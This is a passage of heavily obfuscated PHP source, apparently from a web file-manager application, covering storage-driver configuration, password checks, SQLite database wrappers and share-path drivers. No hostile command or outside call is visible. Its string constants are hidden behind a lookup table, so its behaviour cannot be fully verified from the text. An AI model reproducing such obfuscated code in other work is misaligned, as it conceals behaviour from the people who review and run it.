array($ÊÃÎî³î[37] => 0)); } } } return $œ‘Íµì; } public function updateBackup($„ê±ıµŞ, $šïÍ£°“) { $é½í˜Ô =& $_SERVER[Ã¶¡¶„æ]; if (!$šïÍ£°“) { return; } $â€ç¥äã = Model($é½í˜Ô[755])->config(); if ($â€ç¥äã[$é½í˜Ô[1646]] != $é½í˜Ô[88] || $â€ç¥äã[$é½í˜Ô[758]] != $šïÍ£°“) { return; } $‘°•°¦í = Model($é½í˜Ô[776])->get($é½í˜Ô[786]); $‘°•°¦í = json_decode($‘°•°¦í, !0); if (!$‘°•°¦í) { return; } $‘°•°¦í[$é½í˜Ô[758]] = $„ê±ıµŞ; Model($é½í˜Ô[776])->set(array($é½í˜Ô[786] => $‘°•°¦í)); } public function checkPwd($„ìà¹ûÂ, &$®Ò´Ö“Õ) { $ïã™ á¼ =& $_SERVER[Ã¶¡¶„æ]; if (empty($®Ò´Ö“Õ[$ïã™ á¼[6]])) { return; } $±ÉàÑ´ = json_decode($®Ò´Ö“Õ[$ïã™ á¼[6]], !0); $ù’´Ú½ = $ïã™ á¼[12]; $¦¹ååû = array($ïã™ á¼[2180], $ïã™ á¼[2181], $ïã™ á¼[903]); foreach ($¦¹ååû as $“¾†²•) { if (isset($±ÉàÑ´[$“¾†²•])) { $ù’´Ú½ = $“¾†²•; break; } } if (!$ù’´Ú½) { return; } $×ã˜é«€ = $this->getConfig($„ìà¹ûÂ); $È”©»Ğ° = $×ã˜é«€[$ù’´Ú½]; $¶êÉèö¨ = $±ÉàÑ´[$ù’´Ú½]; if ($¶êÉèö¨ == str_repeat($ïã™ á¼[188], strlen($È”©»Ğ°))) { $±ÉàÑ´[$ù’´Ú½] = $È”©»Ğ°; $®Ò´Ö“Õ[$ïã™ á¼[6]] = json_encode($±ÉàÑ´); } else { if ($¶êÉèö¨ != $È”©»Ğ°) { $®Ò´Ö“Õ[$ïã™ á¼[2179]] = $ïã™ á¼[88]; } } } public function checkConfig(&$“‡¹ˆ¥, $Ú€È‹˜Á = false) { $ÑüÈº =& $_SERVER[Ã¶¡¶„æ]; $¦ä‰’Øˆ = strtolower($“‡¹ˆ¥[$ÑüÈº[95]]); $§Àçå‰Û = json_decode($“‡¹ˆ¥[$ÑüÈº[6]], !0); foreach ($§Àçå‰Û as $´İï¤¾ => $¹ÀË®Çì) { $§Àçå‰Û[$´İï¤¾] = trim($¹ÀË®Çì); } $§Àçå‰Û[$ÑüÈº[2182]] = rand_string(6); $¦ã •¡ = $GLOBALS[$ÑüÈº[6]][$ÑüÈº[89]][$ÑüÈº[832]]; $ÌÍş³å­ = isset($¦ã •¡[$¦ä‰’Øˆ]) ? $¦ã •¡[$¦ä‰’Øˆ] : ucfirst($¦ä‰’Øˆ); $óŒ‡ùõ‡ = $ÑüÈº[74] . $ÌÍş³å­; if (!$ÌÍş³å­ || !class_exists($óŒ‡ùõ‡)) { if ($Ú€È‹˜Á) { return LNG($ÑüÈº[2183]); } write_log(array($ÑüÈº[2184], $“‡¹ˆ¥, get_caller_info()), $ÑüÈº[2185]); show_json(LNG($ÑüÈº[2183]), !1, $“‡¹ˆ¥); } $á¥àÇÜõ = new $óŒ‡ùõ‡($§Àçå‰Û); if (in_array($¦ä‰’Øˆ, $á¥àÇÜõ->objectDriver)) { if (!$á¥àÇÜõ->isBucketCors() && !$á¥àÇÜõ->setBucketCors()) { $ø‘ïí¥ã = LNG($ÑüÈº[2186]); $ø‘ïí¥ã .= $ÑüÈº[2187] . LNG($ÑüÈº[2188]); if ($Ú€È‹˜Á) { return $ø‘ïí¥ã; } show_json($ø‘ïí¥ã, !1); } } $…Ô¢îØ = rtrim($§Àçå‰Û[$ÑüÈº[1195]], $ÑüÈº[8]) . $ÑüÈº[8]; $ì‰’ØôÅ = $á¥àÇÜõ->getPath($…Ô¢îØ . $ÑüÈº[1199]); if (!$á¥àÇÜõ->mkfile($ì‰’ØôÅ)) { if ($Ú€È‹˜Á) { return LNG($ÑüÈº[2186]); } show_json(LNG($ÑüÈº[2186]), !1); } $§Àçå‰Û[$ÑüÈº[1195]] = $…Ô¢îØ; $“‡¹ˆ¥[$ÑüÈº[6]] = json_encode($§Àçå‰Û); $“‡¹ˆ¥[$ÑüÈº[95]] = $ÌÍş³å­; return !0; } public function driverListSystem() { $Àì¥‘İ¿ =& $_SERVER[Ã¶¡¶„æ]; $ÆíÌ…ìî = parent::listData(); $ùÓ¾“åÕ = array(); foreach ($ÆíÌ…ìî as $°ãû³‹›) { unset($°ãû³‹›[$Àì¥‘İ¿[200]], $°ãû³‹›[$Àì¥‘İ¿[85]]); $°ãû³‹›[$Àì¥‘İ¿[6]] = json_decode($°ãû³‹›[$Àì¥‘İ¿[6]], !0); $ùÓ¾“åÕ[] = $°ãû³‹›; } return $ùÓ¾“åÕ; } public function defaultDriver() { $¬ûßû¬Å =& $_SERVER[Ã¶¡¶„æ]; $İºâÀ‡¥ = parent::listData(); $Äö¯É¤¡ = array_filter_by_field($İºâÀ‡¥, $¬ûßû¬Å[37], 1); $Äö¯É¤¡ = $Äö¯É¤¡[0]; if ($Äö¯É¤¡) { $Äö¯É¤¡[$¬ûßû¬Å[6]] = json_decode($Äö¯É¤¡[$¬ûßû¬Å[6]], !0); } return $Äö¯É¤¡; } public function driverInfo($ç“Ïˆ®â) { $Ÿ¦·Èóš =& $_SERVER[Ã¶¡¶„æ]; $‰öˆÍ×£ = array_to_keyvalue(parent::listData(), $Ÿ¦·Èóš[399]); if (!isset($‰öˆÍ×£[$ç“Ïˆ®â])) { return !1; } $¯öÚ©€Û = $‰öˆÍ×£[$ç“Ïˆ®â]; $¯öÚ©€Û[$Ÿ¦·Èóš[6]] = json_decode($¯öÚ©€Û[$Ÿ¦·Èóš[6]], !0); return $¯öÚ©€Û; } public function remove($˜›ØÃ†) { $this->removeShareItems($˜›ØÃ†); return parent::remove($˜›ØÃ†); } public function removeWithFile($òç›äõä, $Ší‡Ò½) { $ÑáÂ¢éÉ =& $_SERVER[Ã¶¡¶„æ]; $û «ú¥í = array($ÑáÂ¢éÉ[823] => $òç›äõä); $©Ãè¾† = Model($ÑáÂ¢éÉ[471])->where($û «ú¥í)->count(); $òç¿öÃÅ = Model($ÑáÂ¢éÉ[471])->where($û «ú¥í)->sum($ÑáÂ¢éÉ[76]); $µÃÔÓœ‹ = $Ší‡Ò½ . $ÑáÂ¢éÉ[2189] . $òç›äõä; $çÁøàª“ = LNG($Ší‡Ò½ == $ÑáÂ¢éÉ[557] ? $ÑáÂ¢éÉ[2190] : $ÑáÂ¢éÉ[2191]); $´ÚÂ¤ƒµ = new TaskFileTransfer($µÃÔÓœ‹, $ÑáÂ¢éÉ[2185], $©Ãè¾†, $çÁøàª“ . "\50{$òç›äõä}\51"); $´ÚÂ¤ƒµ->task[$ÑáÂ¢éÉ[769]] = (double) $òç¿öÃÅ; $ªúãó×ç = KodIO::defaultDriver(); $ƒ“Ş—¢ö = $ªúãó×ç[$ÑáÂ¢éÉ[399]]; $í•Æğèß = "\x7b\151\x6f\x3a{$ƒ“Ş—¢ö}\x7d\57"; $Ÿƒˆ¹å£ = !0; $–ˆÙ¥é = array(); $²ÂÃˆÖŞ = Model($ÑáÂ¢éÉ[199])->where($û «ú¥í)->field($ÑáÂ¢éÉ[2192])->select(); foreach ($²ÂÃˆÖŞ as $ÃáÜ‚œ) { $ºêİÛº¼ = $ÃáÜ‚œ[$ÑáÂ¢éÉ[84]]; $Ï®éæÄØ = $í•Æğèß . str_replace("\x7b\x69\x6f\x3a{$òç›äõä}\x7d\x2f", $ÑáÂ¢éÉ[12], $ºêİÛº¼); if (!IO::exist($ºêİÛº¼)) { $–ˆÙ¥é[] = $ÃáÜ‚œ[$ÑáÂ¢éÉ[468]]; $´ÚÂ¤ƒµ->updateFileEnd($ÃáÜ‚œ[$ÑáÂ¢éÉ[32]], $ÃáÜ‚œ[$ÑáÂ¢éÉ[76]]); continue; } if (IO::exist($Ï®éæÄØ)) { $´ÚÂ¤ƒµ->updateFileEnd($ÃáÜ‚œ[$ÑáÂ¢éÉ[32]], $ÃáÜ‚œ[$ÑáÂ¢éÉ[76]]); continue; } if (!IO::move($ºêİÛº¼, get_path_father($Ï®éæÄØ))) { $Ÿƒˆ¹å£ = !1; break; } $û «ú¥í = array($ÑáÂ¢éÉ[468] => $ÃáÜ‚œ[$ÑáÂ¢éÉ[468]]); $©ºÒìÙ  = array($ÑáÂ¢éÉ[823] => $ƒ“Ş—¢ö, $ÑáÂ¢éÉ[84] => $Ï®éæÄØ); Model($ÑáÂ¢éÉ[199])->where($û «ú¥í)->save($©ºÒìÙ ); } $this->removeByFileID($–ˆÙ¥é); if (!$Ÿƒˆ¹å£) { $´ÚÂ¤ƒµ->stop($µÃÔÓœ‹); return !1; } $´ÚÂ¤ƒµ->end(); if ($Ší‡Ò½ == $ÑáÂ¢éÉ[1834]) { $this->remove($òç›äõä); } } public function progress($Í÷¿´ïì, $ÎøÂŒ·¸) { return Task::get($ÎøÂŒ·¸ . $_SERVER[Ã¶¡¶„æ][2189] . $Í÷¿´ïì); } private function removeByFileID($÷Ğœïäº = array()) { $§Ö’ÁÒ =& $_SERVER[Ã¶¡¶„æ]; if (empty($÷Ğœïäº)) { return; } $”…Ÿ®É‘ = array($§Ö’ÁÒ[468] => array($§Ö’ÁÒ[7], $÷Ğœïäº)); $ñá‚«Ÿµ = Model($§Ö’ÁÒ[1350])->where($”…Ÿ®É‘)->field($§Ö’ÁÒ[402])->select(); if (!$ñá‚«Ÿµ) { return; } $ñá‚«Ÿµ = array_to_keyvalue($ñá‚«Ÿµ, $§Ö’ÁÒ[12], $§Ö’ÁÒ[402]); foreach ($ñá‚«Ÿµ as $µÃ‘‹–) { Model($§Ö’ÁÒ[416])->removeNow($µÃ‘‹–, !1); } } private function removeShareItems($¥éÀáÌğ) { $‚À›£Õ =& $_SERVER[Ã¶¡¶„æ]; $ÏˆæÊ = "\x7b\151\x6f\x3a{$¥éÀáÌğ}\175\x2f"; $¥Ù‰õú = array($‚À›£Õ[402] => 0, $‚À›£Õ[1190] => array($‚À›£Õ[383], "{$ÏˆæÊ}\x25")); $ÌìÕÂÀè = Model($‚À›£Õ[1845])->where($¥Ù‰õú)->field($‚À›£Õ[489])->select(); if (empty($ÌìÕÂÀè)) { return; } $¡ªèİ¯ = array_to_keyvalue($ÌìÕÂÀè, $‚À›£Õ[12], $‚À›£Õ[489]); Model($‚À›£Õ[601])->remove($¡ªèİ¯); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\114\x69\x67\150\164\101\160\x70"; public $modelType = "\123\171\163\x74\x65\155\x4f\x70\x74\151\157\x6e"; public $field = array("\x6e\141\155\145", "\147\162\x6f\165\x70", "\x64\145\x73\143", "\x63\157\156\x74\145\156\x74"); public function listData($·¥÷š¯Ã = false, $ç¤…‰®Ğ = "\x6d\x6f\x64\151\146\171\x54\151\155\x65", $¤âçŠ‰é = true) { return parent::listData($·¥÷š¯Ã, $ç¤…‰®Ğ, $¤âçŠ‰é); } public function remove($â„îÇ±à) { $°²ŸÚ„â = $this->findByName($â„îÇ±à); if (!$°²ŸÚ„â) { return !1; } return parent::remove($°²ŸÚ„â[$_SERVER[Ã¶¡¶„æ][399]]); } public function add($¸ß¢¨†) { if ($this->findByName($¸ß¢¨†[$_SERVER[Ã¶¡¶„æ][32]])) { return !1; } return parent::insert($¸ß¢¨†); } public function update($˜ÌßÏ†, $òºèöÓ„) { $ûŒÃ¦÷ß =& $_SERVER[Ã¶¡¶„æ]; $ÀÆéîôî = $this->findByName($˜ÌßÏ†); $İÉÉÄÙ« = $this->findByName($òºèöÓ„[$ûŒÃ¦÷ß[32]]); if (!$ÀÆéîôî || $İÉÉÄÙ« && $İÉÉÄÙ«[$ûŒÃ¦÷ß[399]] != $ÀÆéîôî[$ûŒÃ¦÷ß[399]]) { return !1; } return parent::update($ÀÆéîôî[$ûŒÃ¦÷ß[399]], $òºèöÓ„); } } goto b•»µ•¯Î¢; FÜ÷¹Ÿ’…Ù: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $èìÖ“Ø =& $_SERVER[Ã¶¡¶„æ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$èìÖ“Ø[6]] =& $config; $this->values[$èìÖ“Ø[7]] =& $in; $this->tpl = TEMPLATE . MOD . $èìÖ“Ø[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($’­¿ÈÄ‡) { if (1 === func_num_args()) { $this->{$’­¿ÈÄ‡} = new $’­¿ÈÄ‡(); } else { $Âµ¼Ü…ê = new ReflectionClass($’­¿ÈÄ‡); $˜ã—£„è = func_get_args(); array_shift($˜ã—£„è); $this->{$’­¿ÈÄ‡} = $Âµ¼Ü…ê->newInstanceArgs($˜ã—£„è); } return $this->{$’­¿ÈÄ‡}; } public function routeBind($Ê¯Ä¬Ê‹, $ºû×ÕÂ«, $£‹£ç°« = 3) { $‹×¬ŒØ =& $_SERVER[Ã¶¡¶„æ]; $ƒ£™âóÑ = $this->in[$‹×¬ŒØ[9]]; $Ê¯Ä¬Ê‹ = str_replace($‹×¬ŒØ[10], $‹×¬ŒØ[11], trim(trim($Ê¯Ä¬Ê‹, $‹×¬ŒØ[8]), $‹×¬ŒØ[12])); if (!$Ê¯Ä¬Ê‹ || count($ƒ£™âóÑ) <= $£‹£ç°«) { return !1; } $‰­Ÿ²‘ = !0; $øˆ•¨…É = explode($‹×¬ŒØ[8], $Ê¯Ä¬Ê‹); for ($¹ŸòÃ·â = 0; $¹ŸòÃ·â < count($øˆ•¨…É); $¹ŸòÃ·â++) { if ($øˆ•¨…É[$¹ŸòÃ·â] != $ƒ£™âóÑ[$£‹£ç°« + $¹ŸòÃ·â]) { $‰­Ÿ²‘ = !1; break; } } if (!$‰­Ÿ²‘) { return; } call_user_func_array(array($this, $ºû×ÕÂ«), array()); } public function routeArgs($Äû®ó°û = 3) { $Ü´© ‘â = $this->in[$_SERVER[Ã¶¡¶„æ][9]]; if (count($Ü´© ‘â) <= $Äû®ó°û) { return array(); } $ËÚãú€» = array(); for ($ı¹Ù ù = $Äû®ó°û; $ı¹Ù ù < count($Ü´© ‘â); $ı¹Ù ù += 2) { $ËÚãú€»[$Ü´© ‘â[$ı¹Ù ù]] = $Ü´© ‘â[$ı¹Ù ù + 1]; $this->in[$Ü´© ‘â[$ı¹Ù ù]] = $Ü´© ‘â[$ı¹Ù ù + 1]; } return $ËÚãú€»; } protected function assign($ï¶’¡›, $ÜƒÌ­ì) { $this->values[$ï¶’¡›] = $ÜƒÌ­ì; } protected function display($ ú±×÷) { ob_end_clean(); extract($this->values); require $this->tpl . $ ú±×÷; } } class DbSqliteBase extends Db { public function __construct($ÜÙñ– = '') { $Ö±ı­¨ =& $_SERVER[Ã¶¡¶„æ]; if (!extension_loaded($Ö±ı­¨[13])) { think_exception(think_lang($Ö±ı­¨[14]) . $Ö±ı­¨[15]); } if (!empty($ÜÙñ–)) { if (!isset($ÜÙñ–[$Ö±ı­¨[16]])) { $ÜÙñ–[$Ö±ı­¨[16]] = 438; } $this->config = $ÜÙñ–; if (empty($this->config[$Ö±ı­¨[17]])) { $this->config[$Ö±ı­¨[17]] = array(); } } } public function connect($ƒñ‰¢ó = '', $šğËÅ¤’ = 0) { $ô†ñÈñ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($this->linkID[$šğËÅ¤’])) { if (empty($ƒñ‰¢ó)) { $ƒñ‰¢ó = $this->config; } $šÉ¢°ß¿ = !empty($ƒñ‰¢ó[$ô†ñÈñ[17]][$ô†ñÈñ[18]]) ? $ƒñ‰¢ó[$ô†ñÈñ[17]][$ô†ñÈñ[18]] : $this->pconnect; $úş×çàâ = $šÉ¢°ß¿ ? $ô†ñÈñ[19] : $ô†ñÈñ[20]; $this->linkID[$šğËÅ¤’] = $úş×çàâ($ƒñ‰¢ó[$ô†ñÈñ[21]], $ƒñ‰¢ó[$ô†ñÈñ[16]]); if (!$this->linkID[$šğËÅ¤’]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$šğËÅ¤’], 30000); if (1 != think_config($ô†ñÈñ[22])) { unset($this->config); } } return $this->linkID[$šğËÅ¤’]; } public function free() { $this->queryID = null; } public function query($ñ¿ÊÖùÈ) { $°Ë‰Ş™ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñ¿ÊÖùÈ; if ($this->queryID) { $this->free(); } think_action_status($°Ë‰Ş™[23], 1); think_status($°Ë‰Ş™[24]); $this->queryID = sqlite_query($this->_linkID, $ñ¿ÊÖùÈ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $åïÄÖá = $this->getAll(); return $åïÄÖá; } } public function execute($¶˜”ºµí) { $ÃôÄ²×¸ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¶˜”ºµí; if ($this->queryID) { $this->free(); } think_action_status($ÃôÄ²×¸[25], 1); think_status($ÃôÄ²×¸[24]); $¯¨™¼Æ = sqlite_exec($this->_linkID, $¶˜”ºµí); $this->debug(); if (!1 === $¯¨™¼Æ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ã¶¡¶„æ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ğ½•‘„ß = sqlite_query($this->_linkID, $_SERVER[Ã¶¡¶„æ][27]); if (!$Ğ½•‘„ß) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Â ôƒˆÓ = sqlite_query($this->_linkID, $_SERVER[Ã¶¡¶„æ][28]); if (!$Â ôƒˆÓ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¥Ç·±°— = array(); if ($this->numRows > 0) { for ($ÂÎúÊ¯ô = 0; $ÂÎúÊ¯ô < $this->numRows; $ÂÎúÊ¯ô++) { $¥Ç·±°—[$ÂÎúÊ¯ô] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¥Ç·±°—; } public function getFields($Ã¢¢Û…) { $™ªŞşÒõ =& $_SERVER[Ã¶¡¶„æ]; $ıë˜¥Ã = $this->query($™ªŞşÒõ[29] . $Ã¢¢Û… . $™ªŞşÒõ[30]); $ğµøâÍò = array(); if ($ıë˜¥Ã) { foreach ($ıë˜¥Ã as $„ÙÔêæ => $ŠÌ¯¯ô’) { $ğµøâÍò[$ŠÌ¯¯ô’[$™ªŞşÒõ[31]]] = array($™ªŞşÒõ[32] => $ŠÌ¯¯ô’[$™ªŞşÒõ[31]], $™ªŞşÒõ[33] => $ŠÌ¯¯ô’[$™ªŞşÒõ[34]], $™ªŞşÒõ[35] => (bool) ($ŠÌ¯¯ô’[$™ªŞşÒõ[36]] === $™ªŞşÒõ[12]), $™ªŞşÒõ[37] => $ŠÌ¯¯ô’[$™ªŞşÒõ[38]], $™ªŞşÒõ[39] => strtolower($ŠÌ¯¯ô’[$™ªŞşÒõ[40]]) == $™ªŞşÒõ[41], $™ªŞşÒõ[42] => strtolower($ŠÌ¯¯ô’[$™ªŞşÒõ[43]]) == $™ªŞşÒõ[44]); } } return $ğµøâÍò; } public function getTables($ØÃ¸âÅÈ = '') { $’ÓëËŒ =& $_SERVER[Ã¶¡¶„æ]; $³Úâ–İ‚ = $this->query($’ÓëËŒ[45] . $’ÓëËŒ[46] . $’ÓëËŒ[47]); $Ñ›±¡ŞÜ = array(); foreach ($³Úâ–İ‚ as $¨‘ÉìãÏ => $‰ü‘) { $Ñ›±¡ŞÜ[$¨‘ÉìãÏ] = current($‰ü‘); } return $Ñ›±¡ŞÜ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¾™æÈ² =& $_SERVER[Ã¶¡¶„æ]; $Ø³ˆ‚Ñî = sqlite_last_error($this->_linkID); $this->error = $Ø³ˆ‚Ñî . $¾™æÈ²[4] . sqlite_error_string($Ø³ˆ‚Ñî); if ($¾™æÈ²[12] != $this->queryStr) { $this->error .= LNG($¾™æÈ²[48]) . $this->queryStr; } think_trace($this->error, $¾™æÈ²[12], $¾™æÈ²[49]); return $this->error; } public function escapeString($¦—öà€ó) { return sqlite_escape_string($¦—öà€ó); } public function parseLimit($œşòü‹) { $‚À„æÈ =& $_SERVER[Ã¶¡¶„æ]; $©½šñÎê = $‚À„æÈ[12]; if (!empty($œşòü‹)) { $œşòü‹ = explode($‚À„æÈ[50], $œşòü‹); if (count($œşòü‹) > 1) { $©½šñÎê .= $‚À„æÈ[51] . $œşòü‹[1] . $‚À„æÈ[52] . $œşòü‹[0] . $‚À„æÈ[53]; } else { $©½šñÎê .= $‚À„æÈ[51] . $œşòü‹[0] . $‚À„æÈ[53]; } } return $©½šñÎê; } } class DbSqlite3Base extends Db { public function __construct($‘ÌñŞú = '') { $¬ğ°¬ô =& $_SERVER[Ã¶¡¶„æ]; if (!class_exists($¬ğ°¬ô[54])) { think_exception(think_lang($¬ğ°¬ô[14]) . $¬ğ°¬ô[55]); } if (!empty($‘ÌñŞú)) { if (!isset($‘ÌñŞú[$¬ğ°¬ô[16]])) { $‘ÌñŞú[$¬ğ°¬ô[16]] = 438; } $this->config = $‘ÌñŞú; if (empty($this->config[$¬ğ°¬ô[17]])) { $this->config[$¬ğ°¬ô[17]] = array(); } } } public function connect($¿ı—¹Äó = '', $€ÛéÇ = 0) { $ÁúÙúæµ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($this->linkID[$€ÛéÇ])) { if (empty($¿ı—¹Äó)) { $¿ı—¹Äó = $this->config; } $this->linkID[$€ÛéÇ] = new SQLite3($¿ı—¹Äó[$ÁúÙúæµ[21]]); if (!$this->linkID[$€ÛéÇ]) { think_exception($this->linkID[$€ÛéÇ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$€ÛéÇ]->busyTimeout(30000); if (1 != think_config($ÁúÙúæµ[22])) { unset($this->config); } } return $this->linkID[$€ÛéÇ]; } public function free() { $this->queryID = null; } public function query($Èƒ¼Ç”ñ) { $øç‹ğ«› =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Èƒ¼Ç”ñ; if ($this->queryID) { $this->free(); } think_action_status($øç‹ğ«›[23], 1); think_status($øç‹ğ«›[24]); $this->queryID = $this->_linkID->query($Èƒ¼Ç”ñ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÒÏõîöü = $this->getAll(); $this->numRows = count($ÒÏõîöü); return $ÒÏõîöü; } } public function execute($ò÷´ôıİ) { $ŞÎôíŠƒ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ò÷´ôıİ; if ($this->queryID) { $this->free(); } think_action_status($ŞÎôíŠƒ[25], 1); think_status($ŞÎôíŠƒ[24]); $®øÀÇì = $this->_linkID->exec($ò÷´ôıİ); $this->debug(); if (!1 === $®øÀÇì) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ã¶¡¶„æ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»öƒ°·ƒ = $this->_linkID->query($_SERVER[Ã¶¡¶„æ][27]); if (!$»öƒ°·ƒ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÃóãØİÔ = $this->_linkID->query($_SERVER[Ã¶¡¶„æ][28]); if (!$ÃóãØİÔ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ÜòÁµõ˜ = array(); while ($àçú¶›ı = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ÜòÁµõ˜[] = $àçú¶›ı; } $this->queryID->reset(); return $ÜòÁµõ˜; } public function getFields($ªà§Œ’²) { $ò¨àµˆ =& $_SERVER[Ã¶¡¶„æ]; $ëì’¼¶ = $this->query($ò¨àµˆ[29] . $ªà§Œ’² . $ò¨àµˆ[30]); $”™Á¯»¶ = array(); if ($ëì’¼¶) { foreach ($ëì’¼¶ as $¢œ‘â«¶ => $ÑØî×Ãæ) { $”™Á¯»¶[$ÑØî×Ãæ[$ò¨àµˆ[32]]] = array($ò¨àµˆ[32] => $ÑØî×Ãæ[$ò¨àµˆ[32]], $ò¨àµˆ[33] => $ÑØî×Ãæ[$ò¨àµˆ[33]], $ò¨àµˆ[35] => (bool) ($ÑØî×Ãæ[$ò¨àµˆ[35]] === $ò¨àµˆ[12]), $ò¨àµˆ[37] => $ÑØî×Ãæ[$ò¨àµˆ[56]], $ò¨àµˆ[39] => (bool) $ÑØî×Ãæ[$ò¨àµˆ[57]], $ò¨àµˆ[42] => (bool) $ÑØî×Ãæ[$ò¨àµˆ[57]]); } } return $”™Á¯»¶; } public function getTables($‡”ÏĞ¸¥ = '') { $¬§Ş¸ˆ =& $_SERVER[Ã¶¡¶„æ]; $¶¥ëƒ‡Ê = $this->query($¬§Ş¸ˆ[45] . $¬§Ş¸ˆ[46] . $¬§Ş¸ˆ[47]); $Åõ­ÖÂÍ = array(); foreach ($¶¥ëƒ‡Ê as $ä’ÙÍôğ => $ò´÷«ÊÚ) { $Åõ­ÖÂÍ[$ä’ÙÍôğ] = current($ò´÷«ÊÚ); } return $Åõ­ÖÂÍ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ù…ğ¬Ü† =& $_SERVER[Ã¶¡¶„æ]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ù…ğ¬Ü†[12] != $this->queryStr) { $this->error .= LNG($Ù…ğ¬Ü†[48]) . $this->queryStr; } think_trace($this->error, $Ù…ğ¬Ü†[12], $Ù…ğ¬Ü†[49]); return $this->error; } public function escapeString($á–Í¹â­) { $áßÂˆã  =& $_SERVER[Ã¶¡¶„æ]; if ($this->_linkID) { return $this->_linkID->escapeString($á–Í¹â­); } return str_ireplace($áßÂˆã [58], $áßÂˆã [59], $á–Í¹â­); } public function parseLimit($—Ùë€âí) { $¶Ğ¯‰ =& $_SERVER[Ã¶¡¶„æ]; $—¾ÚÉÆì = $¶Ğ¯‰[12]; if (!empty($—Ùë€âí)) { $—Ùë€âí = explode($¶Ğ¯‰[50], $—Ùë€âí); if (count($—Ùë€âí) > 1) { $—¾ÚÉÆì .= $¶Ğ¯‰[51] . $—Ùë€âí[1] . $¶Ğ¯‰[52] . $—Ùë€âí[0] . $¶Ğ¯‰[53]; } else { $—¾ÚÉÆì .= $¶Ğ¯‰[51] . $—Ùë€âí[0] . $¶Ğ¯‰[53]; } } return $—¾ÚÉÆì; } } goto fË‡–Œê²¡; Aë°®ªğÌ‰: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ùò˜¥ÌÎ) { $this->pathParse = $ùò˜¥ÌÎ; $this->model = Model($_SERVER[Ã¶¡¶„æ][1350]); } public function getPathOuter($ì½ä) { $Ö“Ö¨¡á =& $_SERVER[Ã¶¡¶„æ]; if (!$ì½ä) { return $ì½ä; } $£ºŞÅğ = $this->parse($ì½ä); return trim(KodIO::makeShare($this->pathParse[$Ö“Ö¨¡á[399]], $£ºŞÅğ[$Ö“Ö¨¡á[399]]), $Ö“Ö¨¡á[8]); } protected function infoParse($ãšÑÄ†İ, $ù§í†û‰ = false, $•½“ì¸ = false) { $®¹õ«˜€ =& $_SERVER[Ã¶¡¶„æ]; $¶ê¹Æ‚é = $this->pathParse[$®¹õ«˜€[399]]; $¶§ÒÌü¶ = trim($this->pathParse[$®¹õ«˜€[1183]], $®¹õ«˜€[8]); return Action($®¹õ«˜€[1358])->sharePathInfo($¶ê¹Æ‚é, $¶§ÒÌü¶, $ù§í†û‰); } public function infoFull($‚ô¹ÈÚ) { $Çİº±Æ =& $_SERVER[Ã¶¡¶„æ]; $å¢‘±Œä = explode($Çİº±Æ[8], trim($‚ô¹ÈÚ, $Çİº±Æ[8])); if (count($å¢‘±Œä) > 1) { $‚æíƒ­Ù = implode($Çİº±Æ[8], array_splice($å¢‘±Œä, 1)); $æ³Îì¶ƒ = $this->model->pathInfoByPath($å¢‘±Œä[0], $‚æíƒ­Ù); if (!$æ³Îì¶ƒ) { return !1; } $this->pathParse[$Çİº±Æ[1183]] = $æ³Îì¶ƒ[$Çİº±Æ[402]]; } return $this->infoParse($‚ô¹ÈÚ); } public function listAll($¼¶ï»Çì) { $×Ùëú– =& $_SERVER[Ã¶¡¶„æ]; $¼‘Õ¹äá = IO::info($this->pathParse[$×Ùëú–[84]]); if (!$¼‘Õ¹äá) { return array(); } $ÚŠ°˜˜ü = $this->model->listAll($¼¶ï»Çì); $’ÃÚ¶³Ç = Model($×Ùëú–[601])->getInfo($¼‘Õ¹äá[$×Ùëú–[489]]); $£Ù•Ï¸› = Action($×Ùëú–[1358]); foreach ($ÚŠ°˜˜ü as &$“´ª¼Ø) { check_abort(); $“´ª¼Ø[$×Ùëú–[86]] = $£Ù•Ï¸›->_shareItemeParse($“´ª¼Ø[$×Ùëú–[86]], $’ÃÚ¶³Ç); } unset($“´ª¼Ø); return $ÚŠ°˜˜ü; } } class PathDriverDbShareLink extends 